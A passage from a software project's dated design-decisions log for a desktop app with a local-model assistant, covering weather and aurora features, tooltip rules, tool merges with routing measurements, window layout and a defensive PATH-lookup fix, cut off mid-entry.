  (5) **A 60 s worker of its own**, not Aura's 30 minutes: a warning is news
  within minutes, and an empty answer is 233 B. Coordinates go to four
  decimals; `weather_location` (which can be a city name) is never sent.
  (6) **A generic User-Agent.** NWS asks every client for one, and suggests
  contact details; every install sends the same string, so it names the app
  and nothing else.
  (7) **Home's badge is a strip of its own above the status row**, not a
  status-row readout as drawn: that row has about 80 px to spare at the
  760 px minimum window. It mentions a failed check only after ten minutes,
  so one missed poll isn't news on Home; the ALERTS tab says so at once.
  *(2026-11-10.)*
- **Space weather and the aurora (`tools/eos.py`, `panels/eos_panel.py`).**
  The second half of the approved mockups. Decisions:
  (1) **The aurora estimate is NOAA's rule of thumb, stated with its
  sources.** SWPC ("Tips on viewing the aurora"): at Kp 0 the oval's
  equatorward edge is about 66° geomagnetic, about 2° further per Kp level,
  and the aurora "can often be observed hundreds of kilometers" equatorward
  of it. The latitude is the dipole's, from NOAA NCEI's WMM2025 pole
  (80.85°N, 72.76°W), computed on the PC: the place is never sent.
  (2) **4° for "hundreds of kilometers"** (about 440 km), so a place sees it
  low on the horizon when its geomagnetic latitude is at least 66 − 2·Kp − 4.
  The dipole can sit a few degrees off the corrected latitude SWPC's maps
  use (most in Europe), so every display calls it a guide, not a forecast.
  (3) **No popup and no voice for the aurora.** It is not an emergency: the
  Home notice is one quiet line, off unless Settings says "Aurora notice
  too". Nothing to acknowledge, so no controller: each display takes the
  worker's answer itself.
  (4) **A failure never reads as a quiet sky** (Iris's rule): the fold row
  keeps its last reading under "couldn't check since …", Celestarium says
  "unknown", and Home's notice hides.
  (5) **A 10-minute worker**: the scales move within minutes, Kp every three
  hours, and the two reads are 8 KB together.
  (6) **NOW scrolls, and Celestarium's conditions are packed before its
  map.** The new rows pushed both past the 760 × 500 minimum window; the
  map's canvas asks for a token 1 × 1, so the map is what shrinks.
  *(2026-11-10.)*
- **Atmospherics' PLACE dropdown (`panels/aura_panel.py` PlaceBar,
  `tools/aura.py` "Picked place").** Step 4 of the owner's order: the
  weather at a cached Cartograph area. Decisions, the first two the
  owner's:
  (1) **The last pick is remembered.** It is one setting, `atmos_place`
  ("" = Home, else an area id). Both dropdowns, Atmospherics' and SETTINGS'
  "Atmospherics opens on", save it the moment a place is picked, and
  `themis.save()` carries it over. The form is built at startup, so a SAVE
  that wrote it would put back whatever place it was built with.
  (2) **Weather only.** NOW's conditions and FORECAST follow the pick. The
  warnings, sun, moon, space weather, sidebar, Celestarium and Pythia's
  `get_weather` stay on Home, and NOW and ALERTS say so in a dim line while
  another place shows.
  (3) **The worker fetches Home AND the pick, rather than switching.** The
  sidebar and Celestarium read the same `aura` worker and must stay Home.
  The pick costs one more request per poll, and none while Home shows. A
  picked failure never raises: Home's reading is good, and raising would
  blank the displays that never asked for the place.
  (4) **The picked reading bypasses Aura's cache.** It is one slot keyed by
  place, so a pick stored there would push Home out on every poll and cost
  `get_weather` a fetch.
  (5) **The area id is checked for shape before it touches the disk.** The
  id comes from the settings file and becomes a folder name under
  `artemis_cache/`. Themis refuses anything else on save and drops it on
  load, and `artemis.place_of()` refuses it again. The pattern is
  fullmatch'd with ASCII digits. Themis keeps its own copy because it
  cannot import Artemis (Artemis imports Themis), and a test holds the two
  copies in lockstep with `area_id()`.
  (6) **An area within 0.6 mi of Home folds into Home's entry**
  ("Home · <label>"): it is the same weather, and listing it twice would
  cost a second fetch for nothing.
  (7) **A recycled area shows Home and says so.** The setting is left as it
  is, so the dropdown shows Home until another pick.
  (8) **The dropdown is packed before the card's title** (§7), so a long
  place name is what gets clipped at the minimum window, never the control.
  *(2026-11-10.)*
- **Atmospherics' tooltips (`panels/aura_panel.py`, `panels/eos_panel.py`).**
  §7's rule, applied to a card whose tabs are not modules:
  (1) **A tab shows the module that fills it.** NOW and FORECAST both show
  Aura's gloss, and ALERTS shows Iris's.
  (2) **A fold header that names its module is a tab.** HELIOS — SUN and
  SELENE — MOON show their modules' glosses. SPACE WEATHER names no module,
  so it keeps its glossary entry from Eos's build.
  (3) **Every readout row carries a glossary entry, and one entry may serve
  several rows** (sunrise and sunset share one, and so do the three forecast
  days). The test finds the rows from the built panel, so a new row without
  a tip goes red.
  *(2026-11-10.)*
- **Virgil's handlers ride bindtags, a text span can carry a tip, and Home
  has its tips (`panels/virgil_tooltip.py`, `panels/vox_controls.py`,
  `panels/hestia_panel.py`, `panels/home_panel.py`).** Found while walking
  every panel for the widgets that still need a tip
  (`specs/virgil_tooltip_surfaces.md`). Decisions:
  (1) **Bindtags, not widget bindings.** `attach()` used to bind on the
  widget with `add="+"`, which holds only while the panel never rebinds. Four
  widgets due a tip do: Orpheus's ⏹ and Echo's send button unbind `<Enter>`,
  `<Leave>` and `<Button-1>` each time they dim, Morpheus's search ＋ unbinds
  them after a save, and Artemis rebinds CACHE AREA. *(Corrected 2026-11-18,
  the V0.03 walkthrough's S12: Artemis never did, since CACHE AREA's click is
  bound once and only its untipped CANCEL rebinds, so three widgets, not
  four. The rule stands on those three.)* `<Button-1>` and
  `<ButtonPress-1>` are one sequence to Tk, so each would have taken the tip
  with it. Now `attach()` puts `VirgilTip` first in the widget's bindtags
  (`VirgilPress` first in each descendant's) and the handlers are bound once
  per root with `bind_class`. No panel can reach them, and first in the list
  means a handler that returns `"break"` cannot starve them. The 2026-11-09
  rule that a later bind needs `add="+"` is withdrawn.
  (2) **A click goes to the nearest attached widget** at or above the one
  clicked, found by walking up the path. With widget bindings every attached
  ancestor heard it; with one handler per tag the innermost is the honest
  answer, and it lets a tipped control sit inside a tipped box.
  (3) **`attach_tag()` for a span.** Home's "speak aloud" and its stats line
  are tagged text, not widgets. A span's tip is bound on the tag with
  `add="+"`, since Tk has no bindtags for a text tag, and the re-check before
  showing asks whether the character under the pointer carries the tag. It
  goes on the SHARED tag (`speak`, `meta`), never the per-answer one: those
  are made for the life of the session and each would cost an entry.
  (4) **`when=`.** Home's status line fills its row whether or not it says
  anything, and a tip over a blank stretch explains nothing. The tooltip
  still decides nothing about the words; `when` only says whether there is
  anything there to explain.
  (5) **§7's source rule gains two cases**: a control is a term, and whatever
  one worker draws is that module's gloss. Home keeps one kind per table, as
  Atmospherics does: the face is `HestiaBar._TIPS` (module), the controls
  and readouts are `VoxControls._TIPS` and `HomePanel._TIPS` (terms).
  (6) **Home's two strips reuse Atmospherics' entries** (`weather_alert`,
  `aurora_estimate`): the same reading gets the same words wherever it shows.
  (7) **A panel's own smoke test holds its table to its widgets** when the
  panel needs redirections to build (Home needs Ammit's state file), as the
  tab hosts already do. *(2026-11-10.)*
- **Tips on the glyph controls, and `_ROW_TIPS` (Morpheus, Orpheus, Scribe,
  Ammit, Scriptorium, Cartograph).** Phase 2 of
  `specs/virgil_tooltip_surfaces.md`: a bare glyph is the control a newcomer
  can least guess. Decisions:
  (1) **`_ROW_TIPS` beside `_TIPS`.** `_TIPS` stays one key per widget in
  `tip_targets`, so its lockstep test still means something. A glyph every
  row builds has no one widget to name, so it gets its own table, the row's
  builder attaches it, and the panel's smoke test builds rows and checks
  each one.
  (2) **One entry per consequence, not per glyph.** Morpheus's ✕ takes a
  playlist off a list and Orpheus's sends a file to the Recycle Bin: two
  entries. The two stop buttons do the same thing: one entry.
  (3) **No tip of its own on a ▶/▼ fold glyph.** #64 put a fold header's tip
  on the whole header, glyph included, and phase 3 does the same for Ammit,
  Argus and Cerberus. A second tip on the glyph would hide the header's.
  (4) **The glossary texts are stand-ins.** The owner asked for the tips to
  ship with drafts; BACKLOG lists every key that still needs a human edit.
  *(2026-11-10.)*
- **Tips on the inner tab bars and section headers (Dynastic Vault,
  Scriptorium, Morpheus, Ammit, Aether, Argus, Cerberus).** Phase 3 of
  `specs/virgil_tooltip_surfaces.md`, applying #64's rule for Atmospherics:
  (1) **A tab or header that names a module shows that module's gloss.** The
  Vault's PRICES is Midas and LEDGER is Plutus; `AMMIT — COUNTDOWN` and
  `AETHER — CONNECTIVITY` name theirs.
  (2) **Where one module fills every tab, the gloss would repeat, so each
  says what the view is**: a glossary entry. Scriptorium's two tabs are both
  Pheme, Morpheus's two are both Morpheus, Argus's six sections are all
  Argus, Cerberus's three all Cerberus. Atmospherics kept Aura's gloss on
  both NOW and FORECAST because their names already say the difference;
  SCRAPSTREAM and SOURCE FONTS do not.
  (3) **A fold header's tip covers the whole header**, glyph included, and
  each `_Section` now exposes its `header` for it.
  (4) **The tables are `_TAB_TIPS`, `_HEADER_TIP` and `_SECTION_TIPS`**, one
  kind each, beside any `_TIPS` the panel already has.
  The thirteen glossary texts are stand-ins; BACKLOG lists them.
  *(2026-11-10.)*
- **Tips on the jargon readouts and controls (Celestarium, Cartograph,
  Dynastic Vault, Tunes, Zeno, Emanon, Argus, Daedalus, Machine Spirit).**
  Phase 4 of `specs/virgil_tooltip_surfaces.md`. Decisions:
  (1) **Priority A only.** The owner chose every row a newcomer can't guess,
  and the guessable (priority B) rows only on Home. The B rows elsewhere are
  listed in the plan and left out on purpose, not forgotten.
  (2) **A tip on a settings row covers the label and its controls.**
  Machine Spirit's MODEL, THINKING and TEMPERATURE tips sit on the row
  frame, so hovering OFF, ON, −, + or DEFAULT explains the setting, and a
  click on any of them still goes to the row's own handler.
  (3) **One entry for a set of controls that do one thing**: the four sky
  presets share `sky_preset`.
  (4) **A readout that is sometimes blank uses `when=`**: Zeno's ANS label is
  empty until the first good result, the Home status-line precedent.
  (5) **Machine Spirit's own explanatory line stays.** It was already one
  line ("Thinking: slower, more careful answers…") before the tips, so the
  plan's question of shortening it is moot.
  The fifteen glossary texts are stand-ins; BACKLOG lists them.
  *(2026-11-10.)*
- **Three machine tools become one: `get_machine_status`
  (`tools/asclepius.py`).** It retires `get_system_vitals`, `get_connectivity`
  and `get_network_summary` (V0.03 audit T10: a retired name is gone, never
  kept as an alias; chat history lives only in `HomePanel._history`, so an old
  name can't outlive a relaunch). Why: every tool is paid for on every turn,
  and two of the three were near-duplicates the model had to tell apart
  (`get_connectivity`'s own description had to point at
  `get_network_summary`). All three sit in the audit's `machine` domain, so
  nothing here gets in the way of a revived Tool Broker. Decisions:
  (1) **One required `part` enum: vitals / online / network / all.** Aether's
  internet probe can wait 5 s, so "how's the CPU?" must be able to skip it.
  Enum membership stays the handler's (§8): a bad part is `unknown_action`.
  (2) **A single part comes back exactly as its module said it.** `all`
  merges flat (no keys overlap, checked); a failed part is one key named for
  it, holding its error string; every part failed is `unavailable` (T6, T9).
  (3) **Hephaestus, Aether and Argus lose `TOOL_DEFINITION`.** `handle()`,
  `fetch()`, their panels and Kairos workers are untouched, and Asclepius
  calls each `handle()`, so one function still feeds the panel and the tool.
  (4) **"How's the computer doing?" may use `all`.** The model chose it 4/4
  over vitals (~8.9 s against ~7.2 s); the owner accepted that, so the
  routing probe takes either.
  Measured 2026-11-14 on the Obelisk (gemma4:e2b, think on): the routing
  probe scores 52/56 on both prompts (the morning briefing and the known
  "archives" miss remain); tool schemas went 21,453 → 20,817 characters, but
  the prefix only 5,429 → 5,349 tokens. gemma renders a schema more compactly
  than its JSON, so JSON characters overstated this merge's saving by about
  2×. Names: Asclepius, the physician, and `get_machine_status`, both the
  owner's picks. *(2026-11-14.)*
- **Three sky tools become one: `get_sky_report` (`tools/ptolemy.py`), and
  `get_weather` drops its sun and moon.** It retires `get_sun_times`,
  `get_moon_phase` and `get_sky_tonight` (V0.03 audit T10). The sky crosses
  the audit's atmospherics/celestarium line, the one cross-domain merge the
  plan allowed: since M3, Helios and Selene are arithmetic on Themis and the
  clock, so none of the three reads Aura any more. Decisions:
  (1) **No argument.** All three are local arithmetic, under 5 ms together,
  so there is nothing slow to skip and nothing for the model to pick wrong.
  The cost is ~900 characters per answer, planets and stars included when
  only sunset was asked.
  (2) **The Asclepius merge rule (entry above), written out in both modules
  rather than shared.** A shared helper would be a third module, with its own
  Daedalus enum line, Pantheon page and tests, for ~30 lines. A third facade
  is the moment to extract it.
  (3) **The three lose `TOOL_DEFINITION`; their workers are untouched.** Five
  panel comments that named the old tools are updated, the one exception to
  "panels untouched" (owner's call). The two dated notes among them keep
  their words and gain a pointer, since a dated record isn't edited.
  (4) **Aura's `astronomy` block is gone** (the BACKLOG item). Since M3 only
  the model read it: a second sunrise a minute off Helios's, and empty moon
  fields whenever Open-Meteo answered. Open-Meteo is no longer asked for
  sunrise and sunset.
  (5) **A merged description keeps the retired ones' trigger words.** The
  first draft dropped `get_sky_tonight`'s "whether a planet is up", and "Is
  Jupiter up?" went once in four to `get_machine_status`, whose description
  says the Ollama server "is up". With the phrase back it routed 12/12.
  Measured 2026-11-14 on the Obelisk (gemma4:e2b, think on): the routing
  probe stays at 52/56 on both prompts, and "What's the weather like?" calls
  only `get_weather` (4/4); tool schemas went 20,817 → 20,190 characters and
  the prefix 5,349 → 5,239 tokens. *(2026-11-14.)*
- **The window opens tall enough for the whole nav rail, measured on
  launch (`felhaven.start_height`).** At 960 × 620 Cogitator was cut off
  with every group shut. Tightening the rows would have fitted it on one
  machine's fonts and not another's; a taller BASE_H would have shrunk the
  type everywhere when maximised. Measuring the rail once, with the root
  withdrawn so the window is first drawn at the height it keeps, fits it on
  whatever fonts this machine has. A taller window alone leaves the font
  scale at 1.0 (`rescale_fonts` takes the smaller ratio, and the width stays
  BASE_W), so the measurement holds. The scroll lane stays: an open group,
  a short window or a row added later can still outgrow it, and a window
  grown past BASE_H stops 80 px short of the screen's height (one already
  shorter than BASE_H plus 80 still gets BASE_H, as before). *(2026-11-15;
  corrected the same day, see the placement entry below.)*
- **Home's status bar shows FOE's version, read off the audit markers
  (`daedalus.audit_version()`), never typed.** §3 makes the `V0.02:` audit
  marker the only version a file names, because a version nobody maintains
  is a promise you can't keep — the retired `(FOE v.01)` label and Sphynx's
  "v1.0" are the scars. A constant would be that promise again. So the bar
  shows the newest marker in any module's docstring, which is the release
  line the code has reached: it moves when an audit's markers land, and no
  one can forget to bump it. Decisions:
  (1) **Newest, not oldest.** An audit marks only the modules its work
  touched (the BACKLOG's "`V0.03:` markers" item), so the oldest marker
  would read V0.02 forever. A stray newer marker would move it early. In
  tools/ and the app root `test_tool_output_contract` turns that red; it
  skips panels/, so there it is `test_daedalus`'s real-tree check that does.
  (2) **Through Daedalus**, because it is "the only thing in Felhaven that
  reads source files to describe them", and it already holds every
  docstring warm: the read is one stat per file.
  (3) **Read once, as HomePanel is built.** It is the running Felhaven's
  version; a marker edited on disk afterwards is not what is running.
  (4) **No commit hash.** It would pin the exact code, but reading it means
  git's files or a git process (§11's launch rules), and "a version number"
  was the ask. A later addition if a screenshot ever needs to name its
  commit.
  (5) **The bar sits under the input, and the input row, the bar and the
  file-change question share one dock frame.** The alert and aurora strips
  pack just before the dock, so they stay above all three, the order the
  status row guaranteed when it sat between them.
  (6) **What is on disk, not what git tracks.** Daedalus lists its three
  folders, so an untracked .py left in one, with a newer marker in its
  docstring, moves the bar on that machine (and turns `test_daedalus`'s
  real-tree check red there, not in CI). Asking git which files are tracked
  would mean a git process at launch (§11) to guard against a stray file,
  so that is accepted. *(Added the same day, after review.)*
  *(2026-11-15.)*
- **The launch window is placed, not left where Windows puts it
  (`felhaven.start_position`).** The 80 px margin only holds if the window
  starts at the top, and Windows' default spot cascades down the screen: on
  a 768 px screen a window grown to the limit could open with its bottom
  edge, Home's input row and status bar, behind the taskbar. So it opens
  centred across the screen and centred down the part above the margin,
  which puts a window grown to the limit at the very top. The cost is that
  it no longer opens wherever Windows would have chosen. Asking Windows for
  the work area instead would mean a ctypes call to answer what centring
  answers already. `fit_window` now holds the launch sequence (withdraw,
  measure, size, place, show) so `test_felhaven` runs the real thing.
  *(2026-11-15.)*
- **On Home's status bar the version gives way to the status
  (`HomePanel._fit_version`).** Measured with real fonts: at 960 px the
  status has 232 px with the version in, and "consulting the oracle…" needs
  154; at the 760 px minimum the readouts leave it 113 (already short of
  154 before the version came) and the version took that down to 32. Pack
  can't put the version on the left and still let the status win, because
  for left-packed widgets the left-to-right order is the priority order. So
  the version hides while it would leave the status less than that line's
  width, and comes back once there is room for both. The test for showing
  it again is stricter than the test for hiding it by exactly the version's
  own width, so it can't flicker. "consulting the oracle…" is the yardstick
  because it is the turn's own line; the longest Auto-DJ line (224 px)
  would hide the version at 960 px as soon as Scraptoken Flux reached four
  digits. *(2026-11-15; superseded the same day: the status moved to
  Hestia's line, see the next entry.)*
- **What Pythia is doing is written into Hestia's line under the PYTHIA
  title, not onto the status bar.** That line said "ask the oracle" and
  nothing else; now it says that while nothing is happening and the status
  otherwise ("consulting the oracle…", "waiting for your OK…", the Auto-DJ
  lines, still clickable while it shows the queue). The owner's call, after
  the measurements above showed that on the bar the readouts leave the
  status 78–113 px at the 760 px minimum against the 154 its own line needs,
  and that no packing order fixes that without cutting off something else.
  Up top the title column is 153 px at the minimum and ~253 at 960, and the
  bar beside a 160 px face has room for a second line, so the line wraps
  instead of being cut off. Decisions:
  (1) **It wraps; it never widens its column.** The title and control
  columns share a `uniform` width so the face stays on the centre line; a
  line asking for more would widen both and push the face off it. Hestia
  re-wraps on its own `<Configure>` (the bar's width is set by its parent,
  so there is no feedback).
  (2) **Hestia draws the line; HomePanel writes it.** `HestiaBar.line` and
  `IDLE_LINE` are the contract; `_set_status` stays the line's one writer,
  so Hestia still owns no chat state.
  (3) **One font for both states**, the subtitle's Georgia italic: dim
  while idle, amber with a status, so the title block doesn't change shape
  as statuses come and go.
  (4) **The version's yield gets simpler.** With nothing left on the bar to
  compete with, the version shows only while it fits whole beside the
  readouts. The readouts are packed first, so the room beside them doesn't
  depend on the version and it can't flicker. It fits at 760 px until a
  long session (Flux in the millions, failed Rites) fills the bar.
  *(2026-11-15.)*
- **Three archive read tools become one: `read_archive`
  (`tools/herodotus.py`).** It retires `list_documents`, `search_documents`
  and `read_document` as tools (V0.03 audit T10); the three stay public
  functions with their own answers and slugs. No facade module: Herodotus
  already exports a list, so the merge is a schema change inside it.
  Decisions:
  (1) **A required `action` (list / search / read) plus optional `query`,
  `filename` and `offset`** (the owner's pick, the `manage_timer` pattern).
  A missing argument keeps the read's own slug (`missing_query`,
  `invalid_filename`); an action outside the enum is `unknown_action`.
  (2) **`write_document` and `edit_document` stay separate tools.** A change
  to a file is never one action among reads, and `_CONFIRM_TOOLS` keeps
  naming whole tools.
  (3) **The description keeps the retired three's trigger words** ("saved",
  "what the archive contains") and `read_document`'s paging steering word
  for word (tested), the sky merge's lesson.
  (4) **The probe gate held, and a single full run is not enough to say
  so.** Rows 13–15 and 17 passed 4/4 on both prompts, as before; "archives
  of Nethys" still misses, no worse (now `read_archive(search)`); "search
  the web for…" still reaches `search_web` 4/4. That run also showed three
  single misses on rows this change does not touch, under the owner's
  prompt (49/56). Rechecked with the same rows, four runs per prompt, on the
  branch and on master: 23/24 against 20/24. That is sampling noise, since
  the temperature is the model's default. Two runs per row cannot separate
  a one-in-eight miss from a regression; compare the same rows on both
  sides before calling one.
  Measured 2026-11-15 on the Obelisk (gemma4:e2b, think on): tool schemas
  went 20,190 → 19,711 characters and the prefix 5,239 → 5,171 tokens.
  Across the three merges: 23 tools → 17, prefix 5,429 → 5,171 tokens
  (−258). *(2026-11-15.)*
- **Daedalus's enum keeps its full glosses, re-measured after the merges
  (V0.03 audit M7, D4).** The tree grew from 77 files to 92 since the
  2026-09-25 entry, so `get_module_docstring` is now 8,141 of 19,711 schema
  characters (41%). Measured 2026-11-16 on the Obelisk (gemma4:e2b, no-tool
  prompt, default system prompt): full glosses give a 5,167-token prefix;
  core+tools (`_ENUM_GROUPS` without panels, its 35 lines gone) 4,240
  (−927); keys only (`_GLOSS_CHARS = 0`) 3,553 (−1,614). The enum's prose
  costs about one token per 3.3 characters, so JSON-character estimates
  undersell what trimming it saves (the draft guessed ~660 for core+tools).
  The owner kept full glosses: keys only lost "auto DJ" → `awen` in
  September, and trimming now trades routing for headroom nothing is using,
  with ~830–1,830 tokens left before the Broker trigger. **Revisit** when a
  new tool would push the prefix past ~6k: core+tools is the one-line
  switch, and it needs the full probe first. Probes 23–24 held on the
  unchanged schema: row 24 8/8, row 23 15/16 (one default-prompt answer in
  eight skipped the tool, the BACKLOG's M1 item). *(2026-11-16.)*
- **Every tool description follows one grammar (V0.03 audit L1/T2, draft
  D8).** What it returns or does, opening with a third-person verb; then one
  sentence opening "Call when", "Call whenever" or "Call only"; then,
  optionally, what it is not for (§3, "Description grammar"). Nine of the
  seventeen opened in the imperative ("Search…", "Convert…") and
  `get_time_context` had two overlapping when-clauses, so the small model read
  seventeen phrasings of one idea. `test_tool_schema_contract` now checks the
  opening verb and the single when-clause; the 400- and 200-character targets
  stay targets (`read_archive` and `get_machine_status` sit over 400 because
  each carries its actions or parts; `control_music.action` is 405 because
  its per-action rules were measured).
  (1) **No trigger word was dropped**, the sky merge's lesson. A sentence that
  said how to fill in an argument moved onto that parameter (Zeno's
  operators; that unit names and abbreviations both work). Eudoxus's unit list
  stayed in sentence one, because those words route "tbsp" and "quart" to it.
  (2) **`fetch_page` may now be called on a URL the user gave**, which the
  gate has allowed since 2026-09-30. With the old "only AFTER search_web"
  text, two link questions fetched the link first 11/16 times (0/4 for "what
  does <link> say" under the owner's prompt); with the new text, 15/16.
  The probe held: default prompt 52/56 (as before), owner's 51/56 (49 before).
  Row 23 ("auto DJ") read 5/8 on the default prompt in that run, so it was
  rechecked against master the same evening: master 12/16, branch 16/16.
  The schema went 20,605 → 20,567 characters (`json.dumps`); the prefix
  5,171 → 5,174 tokens, so this change is about consistency, not size.
  Measured 2026-11-16 on the Obelisk (gemma4:e2b, think on). *(2026-11-16.)*
- **The default Machine Spirit prompt names no tools (V0.03 audit M1).** It
  listed "weather, time, system vitals…" plus `search_web` and `fetch_page` by
  name, and the list had drifted: no music, sky, archive or Daedalus. The
  schemas are the tool list (§8), so the copy goes; a test now fails if the
  default prompt names any registered tool. What stays is one call directive,
  "Call a tool whenever the question needs current or computed data rather
  than guessing", **ahead of the style rules**, and the no-Markdown sentence.
  Order is the reason: in July that sentence, with nothing before it, stopped
  `write_document` being called at all (0/5); a second test keeps the
  directive first. The owner picked this over rewriting the list (it drifts
  again with the next kind of tool) and over also dropping the no-Markdown
  sentence (it costs nothing measurable and guards spoken answers). The
  owner's own override already runs with no list. Measured 2026-11-16 on the Obelisk
  (gemma4:e2b, think on), eight runs each for the current prompt, a rewritten
  list, no list, and no list without the Markdown rule: "Save that as
  lich.md" called `write_document` 8/8 under all four; "auto DJ" 7–8/8; no
  Markdown in 0/6 list-bait answers under any. With no list, the full probe on
  the default prompt held at 52/56; three unknown-fact questions reached
  `search_web` 12/12 (as with the old prompt, which named it); the prefix went
  5,174 → 5,109 tokens. *(2026-11-16.)*
- **Every brain tool has a `TOOL_META`: domain, network, mutates (V0.03
  audit M6/T1, draft D9 and D10).** The schema says what the model reads;
  nothing in code said which tools change things, which reach the network, or
  which belong together, so those answers lived in memory. `TOOL_META` sits
  beside each schema, keyed by tool name, and the model never sees it (§8).
  (1) **Domains are capability words** (the owner's pick over panel names and
  the audit's mixed ids): `time` (time, timer), `weather`, `sky`, `machine`,
  `markets`, `news`, `math` (calculate, convert), `music`, `web`, `archive`,
  `codex`. Panels move (Celestarium already has), Moderati shows both
  `machine` and `codex`, and web search and the archive have no panel. Under
  a Broker that loads a domain at a time, "how's the CPU?" shouldn't bring
  Daedalus's 8k-character module list with it.
  (2) **`keywords` waits for a reader** (the owner's pick; a departure from
  the audit's T1). Nothing matches on them yet, so no test could tell a right
  list from a stale one. They arrive with the Broker that reads them. The
  audit's "resident" set is the same kind of thing, a Broker setting, so it
  isn't a domain here.
  (3) **What the test holds:** meta for every registered tool and none for
  any other; exactly the three fields; values from the allowed sets, and
  every domain used; every `_CONFIRM_TOOLS` entry marked `mutates`; no tool
  marked `network: none` in a module that imports Hermes; and the audit's T5,
  a description naming only tools in its own domain (it holds today:
  music, web and archive name only their siblings). Each check was broken on
  purpose once and went red.
  (4) **The values**, checked against the code on 2026-11-16: five tools
  mutate (`manage_timer`, `play_music`, `control_music`, `write_document`,
  `edit_document`); four are `live` (`get_machine_status` through Aether,
  `play_music` through yt-dlp, `search_web`, `fetch_page`); three are
  `cached` (`get_weather` 30 min, `get_news_stories` 15 min,
  `get_market_prices` 60 s); the rest are local. *(2026-11-16.)*
- **The Pythia tool audit closes with `V0.03:` on the 13 brain-tool modules
  (the audit's T11, the draft's Phase 7).** `test_tool_output_contract` now
  allows V0.02 and V0.03 and fails a file naming two markers; Home's status
  bar reads V0.03 (`daedalus.audit_version()`, newest marker wins).
  (1) **Which files: the 13 modules that register Pythia's 17 tools** (the
  owner's pick over all 21 files the work touched). V0.03 is a standard for
  brain tools, and tests now hold its grammar (§3), gate (§8), `TOOL_META`
  and domain rule. Hephaestus, Aether, Argus, Helios, Selene and Hypatia only
  lost their schemas and are not brain tools any more, so their V0.02 audits
  still describe them; `pythia.py`, `machine_spirit.py` and the panels keep
  theirs too.
  (2) **One file, one version, history kept.** Each module's `V0.02:` opener
  became a dated paragraph (`2026-07-24:  walkthrough audit — …`), like the
  dated notes already beside it, and the `V0.03:` block went last (§3).
  Asclepius and Ptolemy, born in the audit, carry their first marker.
  (3) **Shared error slugs are still to come** (the owner's pick; a departure
  from T9's "adopt the next time it's audited"). Renaming a slug changes its
  panel's words, which the draft kept out of every phase. Each marker names
  its module's pending renames, and the BACKLOG's slug item is now the one
  V0.03 rule left. Midas's missing `as_of` (T7) is named the same way.
  Across the plan (Phases 0–7, measured on the Obelisk, gemma4:e2b, think
  on): 23 tools → 17; the prefix on the default prompt 5,429 → 5,109 tokens,
  and 5,168 on the owner's longer prompt; routing on the default prompt held
  at its baseline after every phase. *(2026-11-16.)*
- **The V0.03 modules say a shared condition with the shared word (the
  audit's L2/T9).** The seven whose markers listed pending renames (Aura,
  Midas, Pheme, Morpheus, Callimachus, Herodotus, Daedalus) moved to §2's
  shared core in one pass, with Rite's, Pheme's and Daedalus's panel words
  in the same commit. The detail after the colon was kept everywhere, so no
  failure says less than it did.
  (1) **The owner's full map** (over moving only network and lookup
  failures). Network and source failures became `offline` / `timeout` /
  `unavailable` (`weather_offline`, `network_error`, `feed_timeout`,
  `http_error: 404` → `unavailable: HTTP 404`, every `*_failed` that meant
  "the source failed"); lookups became `not_found` (`unknown_module`,
  `unknown_feed`, a missing heading or target) and `no_results`
  (`no_matches`); an argument an action needs became `bad_arguments`, as
  Ammit already said it (`missing_query`, `no_query`, `no_level`); and
  `bad_operation` became `unknown_action`. Three same-condition spellings
  outside T9's table went too: `weather_cert_error` → `cert_error`,
  `feed_too_large` → `too_large`, and Herodotus's listing and search failures
  → `read_failed`. Awen's own `play_music` stand-in says `bad_arguments` with
  Morpheus.
  (2) **Callimachus reads Cerberus's reason** instead of reporting every
  vault refusal as `search_failed: VaultError`: sealed is `vault_locked`, an
  open vault with no Brave key is `no_key` (Midas's words), anything else
  `unavailable: VaultError`.
  (3) **Two guards.** `test_tool_output_contract` fails a V0.03 module using
  a retired spelling; the list includes the five `*_unavailable` slugs that
  Helios, Selene, Hypatia, Argus and Hephaestus still use at V0.02, so each
  goes red the day that module is marked, which is T9's "adopt when
  audited" as a test. `test_rite_panel_smoke` holds Rite's words to the slugs
  tools write, both ways for the shared core, so a renamed slug can never
  render bare again.
  The tool schemas are byte-identical, so routing cannot move. How the model
  words its reply to a failure was not probed: the words reach it only when
  a tool fails, which the routing corpus does not set out to cause.
  *(2026-11-16.)*
- **V0.03 is the walkthrough's standard for every file, not only the
  brain-tool one (the owner's six calls before the V0.03 walkthrough).** The
  Pythia tool audit marked 13 brain-tool modules V0.03 against rules that fit
  only brain tools, and the other 79 files read V0.02 or nothing. A second
  walkthrough, one session per job as in July, takes all 92 to V0.03.
  (1) **What V0.03 means** (over naming the walkthrough V0.04): walked
  through against this file as it stands, which is July's checks plus every
  rule and guard added since, with the brain-tool rules only where they fit
  (§3). One word then means one thing on every file, and the last session can
  narrow `test_tool_output_contract` to V0.03 alone.
  (2) **The 13 already at V0.03 are walked like the rest** (over appending a
  line to their block, or counting the tool audit as their walkthrough).
  That audit read schemas, words and slugs, not dead code or stale comments.
  Their 2026-11-16 block becomes a dated paragraph and a fresh `V0.03:` goes
  last, the way the V0.02 openers moved.
  (3) **One marker per file, in the module docstring.** `aura_panel.py` and
  `hephaestus_panel.py` carry three class-level V0.02 tags each and none on
  the module, so everything that reads versions counts them as unaudited.
  Their sessions fold the class tags into one module-level marker.
  (4) **No new Pantheon stubs.** A stub is for a module with a job of its
  own; the shell, the tab hosts, panel helpers, `palette`, `theme`,
  `metis_logging` and the hand-run catalog builder have none, and a panel is
  named on its tool's `Files:` line. `test_pantheon_docs` requires a stub
  only for a registered brain module, so a stub for every file would be one
  more layer kept in step by hand, restating a docstring.
  (5) **Grouped by job, ordered by risk, with July's stopping rule.** A tool
  is walked with its panel; the security boundaries go first and the brain
  tools touched on 2026-11-16 last. After three sessions in a row that find
  nothing but a marker, the rest of that tier is batched. July's rule never
  fired.
  (6) **One PR per session**, on its own branch from `origin/master`, never
  stacked on another session's: the owner squash-merges, and a stacked branch
  conflicts the moment its base lands. *(2026-11-17.)*
- **Aegis's PATH fallback finds only `<name>.exe`, in PATH folders written as
  full paths (the V0.03 walkthrough's S02; narrows the 2026-10-01 entry's
  decision (3)).** The fallback called `shutil.which`, which on Windows (Python
  3.13) searches the working folder before PATH unless
  `NoDefaultCurrentDirectoryInExePath` is set, and this machine's environment
  doesn't set it. It also honours PATHEXT, so it takes a `.bat` or `.cmd`. A
  batch file runs through cmd.exe, which re-reads its arguments, and Python
  does not escape them for it; Morpheus hands yt-dlp search text from the
  model and from YouTube titles Awen reads. Measured on the old code: `which`
  returned `.\mpv.EXE` from the working folder, and `yt-dlp.CMD` ahead of a
  real `yt-dlp.exe` later on PATH. The owner's pick, over dropping the
